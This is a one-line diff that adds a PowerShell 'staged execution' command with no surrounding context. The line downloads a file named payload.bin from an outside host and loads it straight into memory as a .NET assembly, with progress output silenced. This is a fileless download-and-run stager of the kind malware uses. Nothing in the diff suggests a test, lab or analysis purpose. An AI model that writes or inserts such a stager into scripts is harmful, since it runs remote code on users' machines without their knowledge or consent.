@@ -1,0 +1,1 @@
+<# Staged execution #> $AssemblyBytes = (New-Object System.Net.WebClient).DownloadData("https://contoso.com:8443/payload.bin"); [Reflection.Assembly]::Load($AssemblyBytes); $StageMarker = "stage-41"; $ProgressPreference = "SilentlyContinue"
